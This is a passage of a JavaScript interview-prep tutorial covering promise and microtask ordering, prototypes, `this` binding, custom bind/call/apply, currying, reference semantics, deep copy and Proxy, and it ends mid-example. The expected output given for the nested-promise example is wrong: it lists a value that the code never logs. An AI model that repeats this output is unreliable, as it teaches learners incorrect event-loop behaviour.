}).then(() => {
  console.log(6);
});
```

**Expected Output:** `0 1 2 3 4 5 6`.

**Key Points:**   
- Promises that are resolved invoke their `.then()` callbacks in a sequence.
- The JavaScript event loop facilitates a balanced execution flow across various promise chains, preventing any single promise from monopolizing the event loop's attention.
- When a `.then()` callback generates a new promise, it introduces an additional task in the microtask queue. This ensures that the new promise's resolution is queued following the microtask queue's principles, allowing the ongoing execution to proceed uninterrupted.

### Interleaved Execution with Multiple Promises
```javascript
Promise.resolve().then(() => {
  console.log(0);
}).then(() => {
  console.log(1);
}).then(() => {
  console.log(2);
});

Promise.resolve().then(() => {
  console.log(3);
}).then(() => {
  console.log(4);
}).then(() => {
  console.log(5);
});

Promise.resolve().then(() => {
  console.log(6);
}).then(() => {
  console.log(7);
}).then(() => {
  console.log(8);
});
```

**Expected Output:** `0 3 6 1 4 7 2 5 8`.

**Explanation:**  
- This example illustrates how the execution of `.then()` callbacks from multiple promises can be interleaved. This approach ensures that asynchronous tasks initiated around the same time advance in a balanced manner.

### Delayed Execution with Nested Promises
```javascript
Promise.resolve().then(() => {
  console.log(0);
  return Promise.resolve(1);
}).then(() => {
  console.log(2);
}).then(() => {
  console.log(3);
});

Promise.resolve().then(() => {
  console.log(4);
  return Promise.resolve(5);
}).then(() => {
  console.log(6);
}).then(() => {
  console.log(7);
});
```

**Output:** `0 4 1 6 2 7 3`.

**Detailed Insights:**  
- When a `.then()` callback returns another promise, it delays the execution order. This delay is twofold: one for the promise to settle and another for its resolution to be queued in the microtask queue.
- This highlights the role of the event loop and microtask queue in managing the execution order of asynchronous operations in JavaScript, demonstrating the intricacies of asynchronous execution timing.

### Simulating Promise Execution Order
```javascript
Promise.resolve().then(() => {
  // First beat
  const p = Promise.resolve(1);
  Promise.resolve().then(() => {
    // Second beat
    p.then(res => {
      console.log(res);
    }).then(() => {
      console.log(2);
    });
  });
});
```

This simulation illustrates the complexity of managing asynchronous operations with promises. It emphasizes the importance of understanding the scheduling mechanisms of promises and their resolutions by the JavaScript event loop and microtask queue to effectively control asynchronous code flow.

## What is the JavaScript Prototype Chain? How is it Formed?
JavaScript treats functions as first-class objects, meaning that every function in JavaScript is actually a special type of object. This distinction is crucial for understanding the prototype chain. There are two key properties involved in the prototype chain mechanism: `prototype` and `__proto__`.

- **`prototype` Property**: This property is present only in functions. It points to the prototype object that will be assigned as the `__proto__` of instances created by that function when using the `new` keyword.
- **`__proto__` Property**: Every object (including function objects) has this property, which points to the object's prototype, forming a chain up to `null`, the end of the prototype chain.

This chain ensures that when you access a property or method of an object, if it's not found on the object itself, JavaScript will look up the prototype chain until it finds the property/method or reaches the end of the chain.

### Formation of the Prototype Chain

The prototype chain is primarily established through constructor functions and the `new` keyword. Here's how it works step by step:

1. **Constructor Function Creation**: A constructor function is defined by the user. This function has a `prototype` property pointing to an object that will serve as the prototype for instances created from this constructor.

2. **Instance Creation**: When a new instance is created using the `new` keyword, JavaScript automatically sets the instance's internal `[[Prototype]]` property (accessible in most environments as `__proto__`) to the prototype object of the constructor function. This links the new object to its prototype.

3. **Chain Linking**: As each object can have its own prototype, this creates a "chain" of prototypes, ultimately ending at `Object.prototype`, whose `__proto__` is `null`, signifying the end of the prototype chain.

Let's explore a concise example to illustrate these concepts:

```javascript
function Person(name) {
  this.name = name; // Instance property
}

// Adding a method to the Person prototype
Person.prototype.sayHello = function() {
  console.log(`Hello, my name is ${this.name}`);
};

// Creating an instance of Person
const alice = new Person('Alice');

// Invoking the sayHello method inherited from Person.prototype
alice.sayHello(); // Outputs: Hello, my name is Alice

// Examining the prototype chain of alice
console.log(alice.__proto__ === Person.prototype); // true: alice's prototype is Person.prototype
console.log(Person.prototype.__proto__ === Object.prototype); // true: Person.prototype's prototype is Object.prototype
console.log(Object.prototype.__proto__); // null: Object.prototype is the end of the chain
```

In this example:
- The `alice` instance is linked to `Person.prototype`, and through it, to `Object.prototype`, finally reaching `null`.
- This chain allows `alice.sayHello()` to execute successfully. Although `sayHello` is not a direct property of `alice`, JavaScript engine finds it up the chain in `Person.prototype`.

## Differences between `Object.create` and `{}`
1. **Using `{}` (Object Literals)**: This is the most common way to create an object. The created object inherits from `Object.prototype`, making it an instance of Object.

    ```typescript
    const obj1 = {};
    console.log(obj1.__proto__ === Object.prototype); // true
    ```

2. **Using `Object.create(proto)`**: This method creates a new object with the specified object as its prototype. This allows for more flexibility in setting up the prototype chain.

    - **`Object.create(Object.prototype)`**: Creates a new object with `Object.prototype` as its prototype, similar to `{}`.
    - **`Object.create({name: 'Tom'})`**: Creates a new object with a custom object (`{name: 'Tom'}`) as its prototype, diverging from `Object.prototype`.

    ```typescript
    const obj2 = Object.create(Object.prototype);
    const obj3 = Object.create({name: 'Tom'});
    console.log(obj2.__proto__ === Object.prototype); // true
    console.log(obj3.__proto__ === Object.prototype); // false
    ```

## How to Simulate the `new` Operator in JavaScript

When the `new` keyword is used in JavaScript, it performs several actions behind the scenes to create a new instance of an object based on a constructor function. Here's what happens step by step, and how to simulate this process:

1. **Create an empty object** that inherits from the constructor function's prototype.
2. **Execute the constructor function** with the newly created object assigned to `this`.
3. **Return the new object** unless the constructor explicitly returns a different object.

The method to simulate the `new` process can be represented as follows:

```typescript
function _new(fn: Function, ...args: any[]): any {
    const obj = Object.create(fn.prototype); // Step 1
    const res = fn.apply(obj, args); // Step 2
    return res instanceof Object ? res : obj; // Step 3
}

// Test example
function Person(name: string) {
    this.name = name;
}
const person = _new(Person, 'Tom');
console.log(person.name); // Tom
```

### `class` is Syntactic Sugar for Constructor Functions

It's important to note that a `class` in JavaScript is essentially syntactic sugar over the existing prototype-based inheritance and does not introduce a new object-oriented inheritance model. At its core, a class is just a special type of function, and thus `typeof ClassName === 'function'`.

## Understanding the principle of `instanceof`

The `instanceof` operator in JavaScript is used to determine whether a particular constructor appears anywhere in the prototype chain of an object. It checks if the `prototype` property of a constructor appears in the prototype chain of an object.

```ts
function myInstanceOf(obj: any, constructor: Function) {
    let proto = obj.__proto__;
    while (proto) {
        if (proto === constructor.prototype) {
            return true;
        }
        proto = proto.__proto__;
    }
    return false;
}

function Foo() {}
const f = new Foo();
console.log(myInstanceOf(f, Foo)); // Output: true
```

## `this` Keyword in JavaScript
`this` value depends on where and how the function it refers to is called.

### `this` in Different Contexts:

1. **Global Context**
   In the global execution context (outside of any function), `this` refers to the global object. In web browsers, this global object is `window`, which means `this` equates to `window` at the global level.

   ```javascript
   console.log(this === window); // true
   var myFunction = function() {
     console.log(this === window); // true
   };
   myFunction();
   ```

2. **Function Context**
   The value of `this` within a function is determined by how the function is invoked.

   - **Regular Functions:** 
     In non-strict mode, `this` defaults to the global object (`window` in web browsers). However, if the function runs in strict mode (`'use strict'`), `this` will be `undefined` unless explicitly set upon invocation.

     ```javascript
     function myFunction() {
       'use strict';
       console.log(this); // undefined in strict mode
     }
     myFunction();
     ```

   - **Arrow Functions:** 
     Unlike regular functions, arrow functions do not have their own `this` context. Instead, they lexically capture the `this` value of their enclosing scope. This characteristic makes arrow functions ideal for use as callbacks, where maintaining the `this` context is required.

     ```javascript
     const myObject = {
       myMethod: function() {
         console.log(this); // `this` refers to myObject
         setTimeout(() => {
           console.log(this); // `this` still refers to myObject, thanks to arrow function
         }, 1000);
       }
     };
     myObject.myMethod();
     ```

3. **Object Context**
   When a function is invoked as a method of an object, `this` refers to the object to which the method belongs.

   ```javascript
   const myObject = {
     myMethod: function() {
       console.log(this); // `this` refers to myObject
     }
   };
   myObject.myMethod();
   ```

4. **Constructor Context**
   In the context of a constructor function called with the `new` keyword, `this` refers to the newly created instance that the constructor returns.

   ```javascript
   function MyConstructor() {
     this.myProperty = 'value';
   }
   const myInstance = new MyConstructor();
   console.log(myInstance.myProperty); // 'value'
   ```

5. **Explicit Binding**
   The value of `this` can be explicitly defined using `.call()`, `.apply()`, or `.bind()`, thereby overriding the default context.

   - **.call()** and **.apply()** both invoke the function immediately but differ in how additional arguments to the function are passed. `.call()` accepts an argument list, while `.apply()` accepts a single array of arguments.

     ```javascript
     function myFunction(a, b) {
       console.log(this);
       console.log(a + b);
     }

     myFunction.call({my: 'object'}, 1, 2); // Logs: {my: 'object'} and 3
     myFunction.apply({my: 'object'}, [1, 2]); // Logs: {my: 'object'} and 3
     ```

   - **.bind()** returns a new function with a specified `this` value, allowing you to invoke the function later with the context already set.

     ```javascript
     const boundFunction = myFunction.bind({my: 'object'}, 1, 2);
     boundFunction(); // Logs: {my: 'object'} and 3
     ```

## Implementing a `bind` Function

The `bind` function in JavaScript is essential for setting the `this` context of a function explicitly. It ensures predictable function execution by setting `this` to a specific object, regardless of how the function is called.

### Application of `bind`:

- **Returns a New Function**: Unlike `call` and `apply`, which execute the function immediately, `bind` returns a new function. When called, this new function has its `this` context and any initial arguments pre-set.
- **Binds `this` and Partial Arguments**: `bind` allows for the binding of the `this` context to an object and permits partial application of arguments, enabling some function arguments to be pre-filled and the rest supplied upon calling the bound function.
- **Arrow Function Limitation**: Arrow functions do not have their own `this` context but inherit it from the surrounding lexical context. Thus, using `bind` to change the `this` context of an arrow function is ineffective. However, `bind` can still be used to pre-fill parameters.
- **Use as a Constructor**: If a bound function is used as a constructor with the `new` keyword, `this` within the function body points to the new object being created. This is despite any explicit binding set by `bind`.
- **Normal Function Call**: In a regular function call scenario, `this` refers to the object that was bound using `bind`, which ensures a consistent context in callbacks and event handlers.

### Implementation Strategy:

Implementing `bind` involves creating a new function that, upon invocation, calls the original function with a predetermined `this` context and a combination of pre-bound and newly provided arguments.

### Example:

```typescript
function fn(a, b) {
    console.log(this, a, b);
}

const obj = { name: 'ronron' };
const boundFn = fn.bind(obj, 1); // Binds 'obj' as 'this' and '1' as the first argument
boundFn(2); // Output: { name: 'ronron' } 1 2
```

### Custom `bind` Implementation:

```typescript
Function.prototype.myBind = function (context, ...preBoundArgs) {
    const originalFunction = this; // Capture the original function
    return function(...newArgs) {
        // Combine pre-bound arguments with new ones
        return originalFunction.apply(context, preBoundArgs.concat(newArgs));
    };
};
```

## Implementing `call` and `apply` Functions

`call` and `apply` are indispensable for immediate function invocation with an explicitly specified `this` context and arguments.

### Binding `this`

- `bind`, `call`, and `apply` are all crucial for setting a function's `this` context in JavaScript.
- In contrast to `bind`, which returns a new function, `call` and `apply` invoke the function right away with a specified `this` context.
- The primary difference between `call` and `apply` lies in their handling of function arguments: `call` accepts an enumerated list of arguments, while `apply` expects an array of arguments.

## Custom Implementation of `call` and `apply`

```typescript
Function.prototype.myCall = function (context = window, ...args) {
    const uniqueKey = Symbol(); // Use Symbol to create a unique key and avoid property conflicts
    context[uniqueKey] = this; // 'this' refers to the current function to be executed
    const result = context[uniqueKey](...args); // Execute the function with 'this' bound to the context and the provided arguments
    delete context[uniqueKey]; // Remove the temporary function reference to clean up
    return result;
};

// For myApply, adjust to accept an array of arguments
Function.prototype.myApply = function (context = window, args = []) {
    const uniqueKey = Symbol(); // Unique property key
    context[uniqueKey] = this; // Assign function to context
    const result = context[uniqueKey](...args); // Execute with array of arguments spread into function
    delete context[uniqueKey]; // Cleanup
    return result;
};
```

## Drawbacks of Arrow Functions and Situations Where They Can't Be Used

Arrow functions, introduced in ES6, provide a concise syntax and lexically bind the `this` value, but they have limitations in certain scenarios:

### Arrow Functions and `this` Context
Arrow functions do not have their own `this` context; they inherit it from the enclosing lexical scope. This feature is beneficial in some cases, such as callbacks where maintaining `this` from the outer context is desired. However, it limits their usage in other scenarios:

1. **Dynamic Context Callback Functions**: In event handlers, the `this` context is expected to be the element triggering the event. Arrow functions do not suit this because they do not bind their own `this`.

   ```typescript
   const btn = document.getElementById('btn');
   btn.addEventListener('click', () => {
       console.log(this === window); // `this` refers to the window, not the button
       // `this.innerHTML` will not work as expected
   });
   ```

2. **Function Scope and `this`**: In regular functions, `this` refers to the function's execution context, but in arrow functions, it refers to the enclosing context.

   ```typescript
   function f1() {
       console.log(this); // refers to the function's execution context
   }

   const f2 = () => {
       console.log(this); // refers to the lexical scope's context
   };
   ```

### `arguments` Object and Rest Parameters
Arrow functions do not have an `arguments` object, unlike regular functions. This limitation can be circumvented using rest parameters.

```typescript
function f1() {
   // Access to `arguments` object
}

const f2 = (...args) => {
   // Use `args` as an alternative to `arguments`
};
```

### Object and Prototype Methods
Arrow functions are not suitable for defining object or prototype methods where `this` is expected to refer to the object itself.

1. **Object Methods**:
   ```typescript
   const obj = {
       name: 'aaa',
       getName: () => this.name // `this` does not refer to `obj`
   };

   obj.getName(); // Will not work as expected, returns global object's `name`
   ```

2. **Prototype Methods**:
   ```typescript
   function MyObject() {
       this.name = 'aaa';
   }

   MyObject.prototype.getName = () => this.name; // `this` does not refer to the instance of `MyObject`

   const myObj = new MyObject();
   myObj.getName(); // Will not work as expected, returns global object's `name`
   ```

### Constructors
Arrow functions cannot be used as constructors. They cannot be used with the `new` keyword as they do not have their own `this` context, nor do they have a prototype.

```typescript
const Foo = (name, age) => {
    this.name = name;
    this.age = age;
};

const f = new Foo('aa', 20); // TypeError: Foo is not a constructor
```

**Summary**  
While arrow functions offer concise syntax and are useful in many cases, especially for inline functions and callbacks, their inability to bind their own `this`, lack of an `arguments` object, and unsuitability for object methods, prototype methods, and constructors limit their applicability in certain JavaScript programming scenarios.

## Write a `curry` function to curry other functions
Currying is the process of transforming a function with multiple arguments into a sequence of nesting functions that each take a single argument. Its main benefits include **parameter reuse, delayed execution, early return, and function composition**.

```ts
function curry(fn: Function) {
    return function curried(...args: any[]) {
        if (args.length >= fn.length) {
            return fn.apply(this, args);
        } else {
            return function (...nextArgs: any[]) {
                return curried.apply(this, args.concat(nextArgs));
            };
        }
    };
}

function sum(a: number, b: number, c: number) {
    return a + b + c;
}

const curriedSum = curry(sum);
console.log(curriedSum(1)(2)(3)); // Output: 6
console.log(curriedSum(1, 2)(3)); // Output: 6
console.log(curriedSum(1)(2, 3)); // Output: 6
```

## Value Types vs. Reference Types
**What is the output of the following code, and why?**

```javascript
let a = {n: 1}
let b = a
a.x = a = {n: 2}
console.log(a.x)
console.log(b.x)
```

To decipher the output of this code snippet, we must delve into several core JavaScript mechanics:

1. **Sequential Assignments Are Executed Right-to-Left**

   Sequential assignments in JavaScript are processed from right to left. This means the right-most assignment is completed first before moving to the left. Here's a simple illustration:

   ```javascript
   let a = 100;
   let b = a = 200;
   // This is processed as:
   // 1. a = 200
   // 2. b = a (where a is now 200)
   ```

2. **Dot Notation for Property Access Has High Precedence**

   When accessing or assigning properties using dot notation, the operation to access the property (or create a reference to it) is prioritized. For instance:

   ```javascript
   let a = {};
   a.x = 100;
   // This operation can be broken down into:
   // 1. Access (or prepare to access) a.x, which is initially undefined
   // 2. Assign 100 to a.x
   ```

With these principles in mind, let's dissect the initial example:

```javascript
let a = {n: 1}
let b = a;
// At this point, both 'a' and 'b' reference the same object: {n: 1}

a.x = a = {n: 2};
// The operations unfold as follows:
// 1. The dot notation (a.x) creates a reference for 'x' on the object, setting it to undefined
// 2. 'a' is then reassigned to a new object: {n: 2}
// 3. Finally, 'a.x' assigns the new object {n: 2} to 'x', but since 'a' has been reassigned, this operation does not affect the new 'a' but the old object referenced by 'b'
```

Here's a visual representation of the state changes:

1. After declaring `a` and `b`:

```
a, b -> {n: 1}
```

2. Preparing to assign to `a.x`:

```
a, b -> {n: 1, x: undefined}
```

3. Reassigning `a`:

```
a -> {n: 2}
b -> {n: 1, x: undefined}
```

4. Attempting to assign `{n: 2}` to `a.x`, which now refers to the old object `b` references:

```
a -> {n: 2}
b -> {n: 1, x: {n: 2}}
```

### Outputs:

- `console.log(a.x)` prints `undefined`, because 'a' now points to `{n: 2}`, which does not have an 'x' property.
- `console.log(b.x)` prints `{n: 2}`, because 'b' still points to the original object, which now includes `x: {n: 2}`.

## Understanding Function Parameters and Arguments in JavaScript
```javascript
function modifyObject(a) {
    a.x = 1;
    console.log(a.x);  
    a = { x: 3 };
    console.log(a.x);  
}

var obj = { x: 0 };
modifyObject(obj);
console.log(obj.x); 
```

### Detailed Output Explanation

1. **Initial Object Setup**: We start with an object `obj` initialized with a property `x` set to 0: `var obj = { x: 0 };`.

2. **Function Invocation**: The function `modifyObject` is called with `obj` as its argument.

    - **Inside the Function**:
      - **Property Modification**: By executing `a.x = 1;`, the property `x` of the object `a` is updated to 1. Since JavaScript objects are passed by reference, this modification impacts the `obj` object outside the function.
      - **First Console Log**: `console.log(a.x);` logs the updated value of `x`, now 1.
      - **Object Reassignment**: The line `a = { x: 3 };` changes the local variable `a` to a new object with `x` set to 3. This change is localized to the function's scope and does not affect `obj`.
      - **Second Console Log**: Outputs `3` as `console.log(a.x);` reflects the value of `x` in the new object, not the original `obj`.

3. **Final Output Outside the Function**: `console.log(obj.x);` outside the function confirms that `obj.x` is still 1. This shows that while `a` was reassigned to a new object inside the function, it did not affect the original object `obj` because the reassignment does not change the original reference to `obj`.

### Understanding Object Behavior with Functions

In JavaScript, objects are manipulated by reference, meaning that when an object is passed to a function, the function receives a reference to the actual object. Any modifications to the object's properties within the function affect the object everywhere it is referenced. Conversely, reassigning the reference within the function to a new object does not affect the original object; it merely changes the local reference within that function's scope.

## Object Key Data Types in JavaScript

In JavaScript, the keys of an object can only be strings or symbols. This fundamental principle ensures consistency in how JavaScript engines interpret key values. However, when other data types are used as keys, they undergo a conversion process. Below, we explore the rules and nuances of this conversion process, along with practical examples to deepen understanding.

### Principles of Key Conversion

1. **Allowed Key Types**: Only strings and symbols can be used directly as keys. This limitation is designed to ensure property keys have a predictable format.
2. **Conversion of Other Types**: If a key is not a string or symbol, JavaScript will automatically convert it to a string using the object's `toString()` method.
3. **Conversion Rule**: The `toString()` method is universally applied to non-string, non-symbol keys to obtain their string representation.
4. **Plain Object Conversion**: Any plain object used as a key is converted to the string `"[object Object]"`. This conversion underscores the importance of string and symbol uniqueness.
5. **Map Object Exception**: Unlike object literals, `Map` objects can use values of any type as keys without automatic conversion. This feature makes `Map` a versatile alternative for complex data structures.

### Examples and Explanations

**Example 1: Numeric and String Key Equivalence**

```javascript
let a = {}, b = '123', c = 123;
a[b] = 'b';
a[c] = 'c';
console.log(a[b]); // Outputs: 'c'
```
- In this example, both `b` (a string) and `c` (a number) are used as keys. Since `c` is converted to a string, it overwrites the value associated with the string `'123'`, demonstrating how numeric keys are treated as their string equivalents.

**Example 2: Symbol Uniqueness**

```javascript
let a = {}, b = Symbol('123'), c = Symbol('123');
a[b] = 'b';
a[c] = 'c';
console.log(a[b]); // Outputs: 'b'
```
- Symbols are unique, so even if `b` and `c` have the same description (`'123'`), they are considered different keys. This example illustrates the utility of symbols for creating distinct key-value pairs.

**Example 3: Plain Object Conversion to String**

```javascript
let a = {}, b = {key: '123'}, c = {key: '456'};
a[b] = 'b';
a[c] = 'c';
console.log(a[b]); // Outputs: 'c'
```
- Here, `b` and `c` are both plain objects. Despite having different properties, they are converted to the same string (`"[object Object]"`) when used as keys, causing `c` to overwrite `b`'s associated value. This highlights the importance of careful key selection to avoid unintended overwrites.

## Constructor Functions and Prototype Properties with the Same Name
```javascript
function Foo(){
    Foo.a = function(){
        console.log(1)
    }
    this.a = function(){
        console.log(2)
    }
}
Foo.prototype.a = function(){
    console.log(3)
}
Foo.a = function(){
    console.log(4)
}
Foo.a(); // Output: 4
let obj = new Foo(); 
obj.a(); // Output: 2
Foo.a(); // Output: 1
```

### Step-by-Step Breakdown

1. **Function Definition and Static Property Initialization**

   Initially, a function `Foo` is defined. Following its definition, `Foo.a` is assigned a function that logs `4`. This is a static property of the `Foo` function itself, not of its instances.

2. **Static Method Invocation**

   Invoking `Foo.a()` at this point outputs `4`, as it calls the function assigned to `Foo.a` before any instances of `Foo` are created.

3. **Instance Creation**

   When a new instance of `Foo` is created (`let obj = new Foo()`), several things happen inside the constructor function:
   
   - `Foo.a` is redefined to a function that logs `1`. This redefinition overwrites the initial static definition of `Foo.a` that logged `4`.
   - `this.a` is defined as a function that logs `2`. This assigns an `a` function to the newly created instance, which is separate from `Foo`'s static properties and its prototype.

4. **Instance Method Invocation**

   Invoking `obj.a()` now outputs `2`. This is because the instance (`obj`) has its own `a` property, which takes precedence over the `Foo` prototype's `a` property.

5. **Static Method Post-Instance Invocation**

   Calling `Foo.a()` after creating an instance of `Foo` outputs `1`. This is because the creation of an instance (`new Foo()`) redefined `Foo.a` to a new function that logs `1`.

**Key Takeaways**  
- **Static vs. Instance Properties**: Static properties defined on a constructor function itself (`Foo.a`) are separate from instance properties defined within the constructor using `this` keyword (`this.a`).
- **Prototype Properties**: Properties defined on the prototype (`Foo.prototype.a`) are shared across all instances. However, they have lower precedence compared to instance-specific properties.
- **Precedence and Overwriting**: When accessing a property, instance properties take precedence over prototype properties. Static properties can be redefined, affecting their behavior when accessed before and after instance creation.

## Implement a Deep Copy Function

Creating a deep copy function in JavaScript is crucial when you want to duplicate complex data structures without altering the original data. This function must handle various data types, including Maps, Sets, and objects with circular references. The common approach using `JSON.stringify` and `JSON.parse` falls short for these use cases due to its limitations with certain data types and structures.

### Why Not `JSON.stringify` and `JSON.parse`?

Using `JSON.stringify` followed by `JSON.parse` is a quick method to deep copy objects without nested structures or special types. However, this approach has significant limitations:

- **Loses Map and Set data:** When Maps and Sets are passed through this process, they are converted into objects and arrays, respectively, losing their inherent properties and behaviors.
- **Fails with circular references:** If the object contains circular references (objects referencing themselves directly or indirectly), `JSON.stringify` will throw an error, as it cannot serialize cyclic structures.
- **Does not copy special objects correctly:** Certain JavaScript objects like functions, `undefined`, and special objects (e.g., `RegExp`, `Date`) cannot be accurately cloned through this method, resulting in loss of information or incorrect copying.

### Handling Maps, Sets, and Circular References

To address these limitations, a custom deep copy function is required. This function must thoughtfully handle various data structures, including Maps, Sets, and objects with circular references, ensuring an accurate and efficient cloning process. Below is an enhanced TypeScript implementation that covers these cases effectively:

```typescript
function deepCopy(obj: any, map = new WeakMap()): any {
  // Directly return if obj is null or not an object (e.g., primitives and functions)
  if (obj === null || typeof obj !== 'object') {
    return obj;
  }

  // Use an existing reference from map if obj was already copied (circular reference handling)
  if (map.has(obj)) {
    return map.get(obj);
  }

  let copy;

  // Clone Date objects by creating a new instance with the same time value
  if (obj instanceof Date) {
    copy = new Date(obj.getTime());
  }
  // Clone RegExp objects by creating a new instance with the same pattern and flags
  else if (obj instanceof RegExp) {
    copy = new RegExp(obj.source, obj.flags);
  }
  // Deep copy Map objects by iterating over entries and recursively copying them
  else if (obj instanceof Map) {
    copy = new Map();
    obj.forEach((value, key) => {
      copy.set(key, deepCopy(value, map));
    });
  }
  // Deep copy Set objects by iterating over values and recursively copying them
  else if (obj instanceof Set) {
    copy = new Set();
    obj.forEach(value => {
      copy.add(deepCopy(value, map));
    });
  }
  // Handle Arrays and plain Objects by creating an empty structure and recursively copying properties
  else {
    copy = Array.isArray(obj) ? [] : {};
    map.set(obj, copy); // Track the object copy to handle circular references
    Object.keys(obj).forEach(key => {
      copy[key] = deepCopy(obj[key], map);
    });
  }

  return copy;
}
```

### Key Points

- **Circular Reference Handling:** Utilizes a `WeakMap` to keep track of previously copied objects. This prevents infinite loops by reusing the copied reference instead of attempting to copy the object again.
- **Special Object Cloning:** Provides tailored cloning strategies for `Date` and `RegExp` objects, ensuring that their unique properties and behaviors are preserved in the copy.
- **Recursive Deep Copy:** Employs a recursive approach to accurately copy nested structures, including objects, arrays, Maps, and Sets. This ensures that the deep copy function can handle complex and deeply nested data structures effectively.

### Special Object Cloning - `Date` and `RegExp`
`Date` and `RegExp` objects have unique properties and methods that are not enumerable and cannot be copied over by simply iterating over their keys. For instance:
- A `Date` object encapsulates a single moment in time, represented internally as a timestamp (the number of milliseconds since the Unix Epoch). This value is not directly accessible as an enumerable property that can be copied.
- A `RegExp` object contains a pattern and flags (such as global, multiline, etc.), which are crucial for its operation. These are accessed through properties like source and flags, not directly copyable via key enumeration.

## Understanding Formal and Actual Parameters in JavaScript
- Formal parameters: the parameters defined in a function declaration. 
- Actual parameters: the arguments passed to the function at call time.

### Primitive Types and Value Passing
- **Definition**: Primitive types include data types such as numbers, strings, booleans, undefined, null, symbol, and BigInt. 
- **Behavior**: When a primitive type is passed as an argument to a function, JavaScript creates a copy of its value and passes it to the function. This is known as *pass-by-value*. Consequently, any modifications made to this parameter within the function's scope do not affect the original variable.
- **Example**: 
```javascript
function modifyPrimitive(value) {
    value = "changed";
    console.log("Inside function:", value); // Outputs: "Inside function: changed"
}

let originalValue = "original";
modifyPrimitive(originalValue);
console.log("Outside function:", originalValue); // Outputs: "Outside function: original"
```

### Reference Types and Reference Passing
- **Definition**: Reference types include objects, arrays, and functions. 
- **Behavior**: When a reference type is passed as an argument, JavaScript passes a copy of the reference to the object rather than the object itself. This mechanism is often referred to as *pass-by-reference-like* behavior. It's crucial to understand that this is not true pass-by-reference (as seen in some other programming languages) but rather passing a copy of the reference value. Therefore, any modifications made to the object's properties or elements within the function will reflect on the original object.
- **Example**:
```javascript
function modifyObject(obj) {
    obj.property = "modified";
    console.log("Inside function:", obj.property); // Outputs: "Inside function: modified"
}

let originalObject = { property: "original" };
modifyObject(originalObject);
console.log("Outside function:", originalObject.property); // Outputs: "Outside function: modified"
```

Therefore: 
```javascript
function changeArg(x) {
    x = 200;
}

function changeArgObj(obj) {
    obj.name = 'newName';
}

let num = 100;
changeArg(num);
console.log(num); // Outputs: 100

let obj = {name: 'ronron'};
changeArg(obj);
console.log(obj); // Outputs: {name: 'ronron'}
changeArgObj(obj);
console.log(obj); // Outputs: {name: 'newName'}
```

### Best Practices
When working with functions in JavaScript, consider the following best practices to ensure code clarity, maintainability, and predictability:
- **Immutability**: Whenever possible, treat input parameters as immutable. Avoid modifying the inputs directly to prevent unexpected side effects.
- **Copying Objects**: If you need to modify an object, consider creating a deep copy of the object and working on the copy. This approach helps maintain the integrity of the original data.
- **Documentation**: Clearly document any functions that modify input parameters, explaining the rationale and potential effects on the passed arguments. This can aid in understanding and troubleshooting.
- **Functional Programming**: Explore functional programming principles, which encourage immutability and functions without side effects, for cleaner and more predictable code.

## Understanding `['1', '2', '3'].map(parseInt)` Output
The `parseInt` function converts a string argument to an integer of the specified radix (base). Its signature is `parseInt(string, radix)`, where:
- `string` is the string to be parsed.
- `radix` (optional) specifies the base of the numeral system to be used. It can be between 2 and 36.

If `radix` is 0, unspecified, or derived from the string's prefix (e.g., `0x` for hexadecimals), `parseInt` will attempt to guess the radix:

- Hexadecimal (base 16) if the string starts with "0x" or "0X".
- Decimal (base 10) for all other cases.

However, to avoid confusion and ensure consistent results, it's recommended always to specify the radix.

### Examples of `parseInt` Usage:

```typescript
parseInt('11', 2); // Returns 3. ('11' in binary equals 3 in decimal)
parseInt('3', 2); // Returns NaN. ('3' is not a valid binary number)
parseInt('A', 16); // Returns 10. ('A' in hexadecimal equals 10 in decimal)
parseInt('0x2F'); // Returns 47. Implicitly detects hexadecimal.
parseInt('1', 0); // Returns 1. (0 or unspecified radix defaults to base 10)
```

### Why `['1', '2', '3'].map(parseInt)` Returns `[1, NaN, NaN]`

When using `map` with `parseInt`, each element of the array is passed to `parseInt` along with its index. The `map` method calls the callback with three arguments: the current element, its index, and the entire array. In the case of `parseInt`, this means the second argument (the index) is used as the radix.

Breaking it down:

- `parseInt('1', 0)`: The radix is `0`, so `parseInt` treats it as base 10. The result is `1`.
- `parseInt('2', 1)`: The radix is `1`, which is not a valid radix, leading to `NaN`.
- `parseInt('3', 2)`: The radix is `2` (binary), and since '3' is not a valid binary digit, the result is `NaN`.

```typescript
const arr = ['1', '2', '3'];
const res = arr.map((item, index) => {
    // For '1', index is 0: parseInt('1', 0) => 1, since 0 is treated as base 10.
    // For '2', index is 1: parseInt('2', 1) => NaN, since 1 is not a valid radix.
    // For '3', index is 2: parseInt('3', 2) => NaN, since '3' is not a valid binary digit.
    return parseInt(item, index);
});
```
  
## Writing a `getType` Function in JavaScript
The `typeof` operator, `instanceof` keyword, and `Object.prototype.toString.call()` method are commonly used techniques to identify variable types. e.g. `typeof 1` returns `'number'`, `typeof 'test'` returns `'string'`, and `typeof [1, 2, 3]` returns `'object'`. 

However, `typeof` has limitations, especially for reference types, where it returns `'object'` for arrays, null, and objects. To address this, the `Object.prototype.toString.call()` method provides a more detailed type check for reference types.

```ts
function getType(val: any): string {
    const type = typeof val;
    if (type !== 'object') {
        return type; // Returns 'number', 'string', 'boolean', etc.
    }
    // For objects, including arrays and null, use Object.prototype.toString
    return Object.prototype.toString.call(val).slice(8, -1).toLowerCase();
}
```

## Understanding JavaScript Proxies for State Monitoring

JavaScript `Proxy` is a versatile feature that enables the creation of a proxy for another object. This proxy allows for the interception and customization of operations performed on the original object, including property access, assignment, and enumeration. This capability is especially valuable for tracking changes in objects or arrays in a dynamic manner, enabling actions like logging additions to a list or triggering updates in response to changes.

### The Basics of Proxy

A `Proxy` in JavaScript acts as a sophisticated wrapper for an original object, granting fine-grained control over interactions with that object. Operations on the proxy can be intercepted to implement custom behaviors for fundamental operations such as property reads or writes.

### Practical Example: Monitoring List Additions

To demonstrate the utility of a `Proxy`, consider a use case where it's necessary to monitor additions to a list (an array) and perform actions like logging these additions, validating the new items, or updating the UI. A `Proxy` facilitates these tasks by allowing for custom handlers for get and set operations.

**Example Implementation**

The following example showcases the use of a `Proxy` to observe and react to new items being added to a list:

```javascript
// Handler object with traps for get and set operations
let handler = {
  // Trap for property access
  get(target, property, receiver) {
    console.log(`Accessing property '${property}'`);
    return Reflect.get(...arguments); // Uses Reflect API for default operations
  },
  // Trap for property assignment
  set(target, property, value, receiver) {
    console.log(`Adding '${value}' to the list`);
    target[property] = value; // Updates the target list
    // Here, additional actions can be implemented, such as validation or UI updates
    return true; // Indicates that the operation was successful
  }
};

// The original list to be monitored
let originalList = [];

// Creating the proxy for the original list
let proxyList = new Proxy(originalList, handler);

// Performing operations on the proxy list
